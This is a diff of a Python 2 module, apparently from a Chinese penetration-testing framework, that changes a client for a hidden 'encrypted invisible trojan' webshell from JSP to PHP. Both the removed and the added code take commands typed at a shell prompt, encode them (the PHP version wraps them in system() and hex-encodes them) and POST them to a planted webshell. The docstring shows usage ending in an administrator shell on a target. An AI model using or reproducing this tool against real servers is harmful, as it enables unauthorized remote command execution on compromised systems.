@@ -18,12 +18,14 @@ __Python_Version_:2.7.11
 
 Pycmd加密隐形木马：
 利用方式如下
-ple > set target http://192.168.10.149:8080/Test/1.jsp
+ple > set target http://10.0.3.13/test/p.php
 ple > set passwd test
 ple > run
 PHP_Shell> whoami
 ststem/administrator
 
+python Shellsploit.py
+USE MODULE=>payload\web\webserver_php
 '''
 
 from modules.exploit import BGExploit
@@ -38,14 +40,14 @@ YELLOW = '\033[1;33m'
 WHITE = '\033[1;37m'
 BLUE='\033[1;34m'
 END = '\033[0m'
-shell_decode = "GB2312"
 
 class PLScan(BGExploit):
+    
     def __init__(self):
         super(self.__class__, self).__init__()
         self.info = {
-            "name": "Pycmd加密隐形木马连接-jsp",  # 该POC的名称
-            "product": "Pycmd加密隐形木马连接-jsp",  # 该POC所针对的应用名称,
+            "name": "Pycmd加密隐形木马连接-php",  # 该POC的名称
+            "product": "Pycmd加密隐形木马连接-php",  # 该POC所针对的应用名称,
             "product_version": "1.0",  # 应用的版本号
             "desc": '''
                 web一句话连接客户端
@@ -69,14 +71,14 @@ class PLScan(BGExploit):
             "URL": {
                 "default": "",
                 "convert": self.convert.str_field,
-                "desc": "目标",
+                "desc": "目标地址",
                 "Required":"no"
             },
             #以下内容可以自定义
             "PASSWORD": {
                 "default": "",
                 "convert": self.convert.str_field,
-                "desc": "password",
+                "desc": "webshell password",
                 "Required":"no"
             },
             "mode": {
@@ -87,7 +89,7 @@ class PLScan(BGExploit):
             }
         })
 
-            
+        
         #自定义返回内容
         self.register_result({
             #检测标志位，成功返回置为True,失败返回False
@@ -102,57 +104,31 @@ class PLScan(BGExploit):
             "error": ""
         })
         
-    def chuli(self,s):
-        s = s.replace("\n","").replace("\r","")
-        s = binascii.a2b_hex(s)                           #16进制编码
-        s = base64.b64decode(s).decode(shell_decode) #base64编码
-        return s
-
     def payload(self):
         url = self.option.URL['default']
         password = self.option.PASSWORD['default']
         
         try:
-            shell_path = ""
-            shell_cmd = raw_input(GREEN+"JSP_Shell>"+END)
-            while(cmp(shell_cmd,"q")):
-                if shell_cmd != "":
-                    if shell_path == "":
-                        username = binascii.b2a_hex(base64.b64encode(password + "=A&z0=" + shell_decode).encode(shell_decode))
-                        password=1
-                    else:
-                        if shell_path[0]!='/':#根据/判断是windows服务器还是Linux服务器
-                            username = binascii.b2a_hex(base64.b64encode(password + "=M&z0=" + shell_decode + "&z1=" + "/ccmd").encode(shell_decode))
-                            password = binascii.b2a_hex(base64.b64encode("cd /d \"" + shell_path+"\"&" + shell_cmd + "&echo [S]&cd&echo [E]").encode(shell_decode))
-                        else:
-                            username = binascii.b2a_hex(base64.b64encode(password + "=M&z0=" + shell_decode + "&z1="+"-c/bin/sh").encode(shell_decode))
-                            password = binascii.b2a_hex(base64.b64encode("cd " + shell_path + "/;"+shell_cmd + ";echo [S];pwd;echo [E]").encode(shell_decode))
-                            postdata = urllib.urlencode({
-						"username":username,     #构造post参数
-						"password":password
-						})
-                            req = urllib2.Request(
-						url     = url,          #木马url地址
-						data    = postdata,
-						headers = headers
-						)
-                            response = urllib2.urlopen(req)
-                            if shell_path == "":
-                                s = self.chuli(response.read())	#处理密文
-                                s = s.split('\t')
-                                shell_path = s[0][3:]	#第一次获取服务器路径
-                                shell_cmd = shell_cmd
-                            else:
-                                s = self.chuli(response.read())	#处理密文
-                                s = s.split('[S]')
-                                shell_path = s[len(s)-1].split('[E]')[0].replace("\r","").replace("\n","") + "\\"#获取路径
-                                sys.stdout.write(s[0][3:]) 	#输出执行结果
-                                for i in range(1,len(s)-1):
-                                    print s[i]	#输出执行结果
-                                    shell_cmd = raw_input(GREEN+"JSP_Shell>"+END)
-        except Exception, e:
-            print e
-       
+            content=''
+            cmd=raw_input(GREEN+'PHP_Shell>'+END)
+            while(cmp(cmd,"q")):
+                if cmd != "":
+                    content  = 'system'+'('+'"'+cmd+'"'+');'
+                    content  = binascii.b2a_hex(content)
+                    postdata = urllib.urlencode({
+                        password:content})
+                    req = urllib2.Request(
+					url = url,            								#木马url地址
+					data = postdata,
+					headers = headers
+					)
+                    response = urllib2.urlopen(req).read()
+                    print response
+                    cmd = raw_input(GREEN+'PHP_Shell>'+END)
+                else:
+                    cmd = raw_input(GREEN+'PHP_Shell>'+END)
+        except Exception,e:
+            print e       
     def exploit(self):
         self.payloads()
 
